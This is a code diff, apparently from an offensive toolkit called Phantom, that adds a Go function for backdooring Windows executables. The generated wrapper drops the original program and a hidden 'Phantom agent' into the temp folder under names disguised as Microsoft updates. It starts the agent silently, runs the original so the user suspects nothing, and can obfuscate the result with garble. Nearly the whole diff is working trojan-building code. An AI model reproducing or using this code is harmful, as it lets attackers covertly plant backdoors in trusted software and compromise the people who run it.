@@ -52,9 +52,9 @@ func BackdoorBinary(cfg BinaryBackdoorConfig) (string, error) {
 		return "", fmt.Errorf("cannot read agent binary: %w", err)
 	}
 
-	// PE (Windows .exe)
+	// PE (Windows .exe) — use Go bundler approach (reliable, no shellcode)
 	if inputData[0] == 'M' && inputData[1] == 'Z' {
-		return backdoorPE(inputData, agentData, cfg.OutputBinary)
+		return backdoorPEBundler(cfg.InputBinary, agentPath, cfg.OutputBinary, cfg.Obfuscate)
 	}
 
 	// ELF (Linux)
@@ -66,7 +66,131 @@ func BackdoorBinary(cfg BinaryBackdoorConfig) (string, error) {
 }
 
 // ══════════════════════════════════════════
-//  PE BACKDOORING (Windows)
+//  PE BUNDLER BACKDOOR (Go embed approach)
+// ══════════════════════════════════════════
+
+// backdoorPEBundler creates a Windows EXE that embeds both the original binary
+// and the Phantom agent. On execution it:
+//  1. Extracts and silently starts the Phantom agent
+//  2. Extracts and runs the original app with all args forwarded
+// Built with pure Go — no shellcode, no PE patching.
+func backdoorPEBundler(origPath, agentPath, outputPath string, obfuscate bool) (string, error) {
+	// Create a temp build dir
+	tmpDir, err := os.MkdirTemp("", "phantom-bundle-*")
+	if err != nil {
+		return "", fmt.Errorf("tmpdir: %w", err)
+	}
+	defer os.RemoveAll(tmpDir)
+
+	// Stage the two payload files
+	if err := copyFile(origPath, filepath.Join(tmpDir, "payload_orig.exe")); err != nil {
+		return "", fmt.Errorf("copy orig: %w", err)
+	}
+	if err := copyFile(agentPath, filepath.Join(tmpDir, "payload_agent.exe")); err != nil {
+		return "", fmt.Errorf("copy agent: %w", err)
+	}
+
+	// Write the bundler Go source
+	src := `package main
+
+import (
+	_ "embed"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"syscall"
+)
+
+//go:embed payload_orig.exe
+var origExe []byte
+
+//go:embed payload_agent.exe
+var agentExe []byte
+
+func main() {
+	tmp := os.TempDir()
+	origTmp := filepath.Join(tmp, "msupdate_app.exe")
+	agentTmp := filepath.Join(tmp, "msupdate_svc.exe")
+	os.WriteFile(origTmp, origExe, 0755)
+	os.WriteFile(agentTmp, agentExe, 0755)
+
+	// Start agent silently in background
+	agentCmd := exec.Command(agentTmp)
+	agentCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	agentCmd.Start()
+
+	// Run original binary normally, forwarding all args
+	origCmd := exec.Command(origTmp, os.Args[1:]...)
+	origCmd.Stdin = os.Stdin
+	origCmd.Stdout = os.Stdout
+	origCmd.Stderr = os.Stderr
+	origCmd.Run()
+}
+`
+	srcPath := filepath.Join(tmpDir, "main.go")
+	if err := os.WriteFile(srcPath, []byte(src), 0644); err != nil {
+		return "", fmt.Errorf("write src: %w", err)
+	}
+
+	// Write a minimal go.mod
+	goMod := "module bundler\n\ngo 1.21\n"
+	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
+		return "", fmt.Errorf("write go.mod: %w", err)
+	}
+
+	// Ensure outputPath is absolute so it survives the tmpDir context
+	absOutput, err := filepath.Abs(outputPath)
+	if err != nil {
+		absOutput = outputPath
+	}
+	os.MkdirAll(filepath.Dir(absOutput), 0755)
+
+	env := append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")
+
+	if obfuscate {
+		garblePath := ""
+		for _, g := range []string{"garble", filepath.Join(os.Getenv("HOME"), "go", "bin", "garble"), "/usr/local/bin/garble"} {
+			if p, err := exec.LookPath(g); err == nil {
+				garblePath = p
+				break
+			}
+		}
+		if garblePath != "" {
+			cmd := exec.Command(garblePath, "-literals", "-tiny", "-seed=random",
+				"build", "-ldflags", "-s -w -H=windowsgui", "-o", absOutput, ".")
+			cmd.Dir = tmpDir
+			cmd.Env = append(env, "GOTOOLCHAIN=local")
+			if out, err := cmd.CombinedOutput(); err == nil {
+				return absOutput, nil
+			} else {
+				_ = out // fall through to plain build
+			}
+		}
+	}
+
+	// Plain build (or garble fallback)
+	ldf := "-s -w -H=windowsgui"
+	cmd := exec.Command("go", "build", "-trimpath", "-ldflags", ldf, "-o", absOutput, ".")
+	cmd.Dir = tmpDir
+	cmd.Env = env
+	if out, err := cmd.CombinedOutput(); err != nil {
+		return "", fmt.Errorf("bundle build failed: %s\n%s", err, strings.TrimSpace(string(out)))
+	}
+
+	return absOutput, nil
+}
+
+// copyFile copies src to dst.
+func copyFile(src, dst string) error {
+	data, err := os.ReadFile(src)
+	if err != nil {
+		return err
+	}
+	return os.WriteFile(dst, data, 0755)
+}
+
+// ══════════════════════════════════════════
+//  PE SECTION INJECTION (legacy, unused)
 // ══════════════════════════════════════════
 
 // backdoorPE adds a new .phantom section to a PE file containing
